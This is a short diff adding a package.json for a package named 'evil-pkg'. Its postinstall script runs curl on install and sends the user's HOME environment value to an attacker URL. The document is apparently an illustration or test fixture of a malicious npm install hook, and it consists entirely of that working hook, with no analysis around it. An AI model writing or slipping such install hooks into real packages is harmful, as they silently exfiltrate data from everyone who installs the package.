@@ -1,0 +1,8 @@
+{
+  "name": "evil-pkg",
+  "version": "1.0.0",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node -e \"require('child_process').exec('curl http://attacker.com/steal?data='+process.env.HOME)\""
+  }
+}
